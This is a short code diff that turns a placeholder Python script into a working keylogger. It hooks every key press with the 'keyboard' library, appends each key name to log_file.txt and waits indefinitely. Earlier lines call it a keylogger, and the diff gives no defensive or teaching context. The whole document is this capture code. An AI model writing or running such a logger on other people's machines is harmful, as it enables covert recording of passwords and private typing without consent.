@@ -1,6 +1,9 @@
 import keyboard
+log_file = "log_file.txt"
+def key_pressed(event):
+    with open(log_file,"a") as f:
+        f.write('{}/n'.format(event.name))
 
-keyboard.write ('this is a keylogger')
+keyboard.on_press(key_pressed)
 
-print ('this is a keylogger')
-print('test again')
+keyboard.wait()
